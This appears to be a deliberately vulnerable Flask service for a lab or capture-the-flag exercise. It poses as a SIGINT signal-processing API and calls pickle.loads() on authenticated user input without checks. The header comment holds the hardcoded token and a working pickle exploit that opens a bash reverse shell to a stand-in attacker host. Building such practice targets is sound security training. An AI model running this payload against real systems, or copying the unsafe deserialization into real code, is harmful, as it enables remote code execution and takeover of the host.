# DESERT WIRE — Signal Processing API
# VULNERABILITY: Python Pickle Deserialization in POST /api/signal/process
#
# The /api/signal/process endpoint accepts base64-encoded binary data.
# It decodes and calls pickle.loads() without validation.
# Any authenticated request can submit a malicious pickle payload for RCE.
#
# Auth: Authorization: Bearer DSRT-SIG-4a7f2c91
#
# Exploit (generate malicious pickle):
#   import pickle, os, base64
#   class Exploit(object):
#       def __reduce__(self):
#           return (os.system, ("bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'",))
#   payload = base64.b64encode(pickle.dumps(Exploit())).decode()
#   # POST {"payload": payload, "format": "binary", "source": "test"}

from flask import Flask, request, jsonify
import pickle, base64, os, time, hashlib, json

app = Flask(__name__)

VALID_TOKEN = "DSRT-SIG-4a7f2c91"

SIGNAL_STATS = {
    "processed_today": 847,
    "active_pipelines": 4,
    "throughput_mbps": 12.4,
    "classification": "SECRET"
}

def check_auth(req):
    auth = req.headers.get("Authorization","")
    if not auth.startswith("Bearer "):
        return False
    return auth[7:] == VALID_TOKEN

@app.route("/api/status")
def status():
    return jsonify({
        "service": "SIGINT Signal Processing Cluster",
        "version": "4.1.2",
        "status": "operational",
        "authentication": "Bearer token required",
        "endpoints": [
            "POST /api/signal/process  (auth required)",
            "GET  /api/signal/stats    (auth required)",
            "GET  /api/status"
        ]
    })

@app.route("/api/signal/stats")
def stats():
    if not check_auth(request):
        return jsonify({"error":"Unauthorized — Bearer token required"}), 401
    return jsonify({**SIGNAL_STATS, "timestamp": time.time()})

# ── VULNERABLE ENDPOINT ──────────────────────────────────────────────────────
# Accepts base64-encoded pickle binary payloads for "signal processing"
# No validation or sandboxing — direct pickle.loads() on user input
# ─────────────────────────────────────────────────────────────────────────────
@app.route("/api/signal/process", methods=["POST"])
def process_signal():
    if not check_auth(request):
        return jsonify({"error":"Unauthorized — Bearer token required"}), 401

    data = request.get_json() or {}
    payload_b64 = data.get("payload","")
    fmt         = data.get("format","binary")
    source      = data.get("source","unknown")

    if not payload_b64:
        return jsonify({"error":"payload required","format":"base64-encoded binary"}), 400

    try:
        raw = base64.b64decode(payload_b64)
    except Exception:
        return jsonify({"error":"Invalid base64 encoding"}), 400

    if fmt == "binary":
        try:
            # VULNERABILITY: unsafe deserialization of attacker-controlled data
            result = pickle.loads(raw)
            return jsonify({
                "status":    "processed",
                "source":    source,
                "result":    str(result)[:512] if result is not None else "null",
                "bytes_in":  len(raw),
                "timestamp": time.time(),
                "pipeline":  "SIGINT-PROC-4"
            })
        except Exception as e:
            return jsonify({"error":"Processing failed","detail":str(e)}), 500

    elif fmt == "json":
        try:
            parsed = json.loads(raw)
            return jsonify({"status":"processed","parsed":parsed,"timestamp":time.time()})
        except Exception as e:
            return jsonify({"error":"JSON parse error","detail":str(e)}), 400

    return jsonify({"error":f"Unknown format: {fmt}"}), 400

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
